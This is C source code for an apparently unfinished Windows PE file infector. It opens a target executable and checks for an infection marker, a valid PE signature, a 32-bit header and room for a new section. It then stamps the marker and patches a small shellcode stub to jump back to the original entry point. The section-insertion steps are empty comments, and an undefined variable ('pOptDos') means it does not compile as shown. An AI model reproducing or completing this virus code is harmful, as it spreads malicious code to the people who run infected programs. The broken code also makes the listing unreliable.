#include <Windows.h>
#include <winnt.h>
#include <fileapi.h>
#include <handleapi.h>

#include <stdio.h>
#include <malloc.h>
#include <string.h>

void ReadOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
        puts("Error when set file pointor!");
        exit(1);
    }
    if(ReadFile(hFile, buf, size, NULL, NULL) == FALSE) {
        puts("Error when read file!");
        exit(1);
    }
}

void WriteOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
        puts("Error when set file pointor!");
        exit(1);
    }
    if(WriteFile(hFile, buf, size, NULL, NULL) == FALSE) {
        puts("Error when write file!");
        exit(1);
    }
}

#define BUF_SIZE (1 << 20)
#define CODE_SIZE (1 << 8)

const char *TARGET = ".\\test.exe";
char buf[BUF_SIZE];

#define JMP_POINT_OFFSET 4
char shellCode[CODE_SIZE] = {0x55, 0x8B, 0xEC, 0xB8, 0x44, 0x33, 0x22, 0x11, 0xFF, 0xE0, 0x5D, 0xC3};

HANDLE OpenTarget() {
    HANDLE hFile = CreateFileA(
        TARGET, 
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if(hFile == NULL) {
        puts("Open target failed.");
        exit(1);
    }
    puts("Open target success!");
    return hFile;
}

IMAGE_DOS_HEADER dosHdr;
IMAGE_FILE_HEADER fileHdr;
IMAGE_OPTIONAL_HEADER32 optHdr;

void InfectTarget(HANDLE hFile) {
    PIMAGE_DOS_HEADER pDosHdr = &dosHdr;
    PIMAGE_FILE_HEADER pFileHdr = &fileHdr;
    PIMAGE_OPTIONAL_HEADER32 pOptHdr = &optHdr;
//======================================================================
    // Get DOS Header
    ReadOffset(
        hFile, 0, FILE_BEGIN, 
        (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    // Check infected
    if(pOptDos->e_res[0] == 0x1234) {
        puts("Target infected!");
        exit(1);
    }
    // Check Signature
    DWORD pe00;
    ReadOffset(
        hFile, pDosHdr->e_lfanew, FILE_BEGIN,
        (PVOID)&pe00, sizeof(DWORD)
    );
    if(pe00 != 0x00004550) {
        puts("Not a pe file!");
        exit(1);
    }
    // Get File Header
    ReadOffset(
        hFile, 0, FILE_CURRENT, 
        (PVOID)&fileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    // Get Optional Header
    ReadOffset(
        hFile, 0, FILE_CURRENT, 
        (PVOID)&optHdr, 
        /* 224 when 32 bits, same as pFileHdr->SizeOfOptionalHeader */
        sizeof(IMAGE_OPTIONAL_HEADER32) 
    );
    if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        puts("Not a 32 bits exe!");
        exit(1);
    }
    // Check Headers Space
    long currentSize = \
        pFileHdr->NumberOfSections * sizeof(IMAGE_SECTION_HEADER) \
        + pDosHdr->e_lfanew + 0x4 \
        + sizeof(IMAGE_FILE_HEADER) \
        + pFileHdr->SizeOfOptionalHeader;
    long alignSize = pOptHdr->SizeOfHeaders;
    if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
        puts("No space to insert a new sections!");
        exit(1);
    }
//======================================================================
    // Start Infecting
    // Set Infected tag
    pDosHdr->e_res[0] = 0x1234;
    // Get old entry VA
    long oldVA = pOptHdr->AddressOfEntryPoint + pOptHdr->ImageBase;
    long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
    *jmpPoint = oldVA;
    // Set New Section Header

    // Set New Section

    // Saved to file
    WriteOffset(
        hFile, 0, FILE_BEGIN,
        (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
    );

}

int main() {
    HANDLE hf = OpenTarget();
    InfectTarget(hf);
    CloseHandle(hf);
    return 0;
}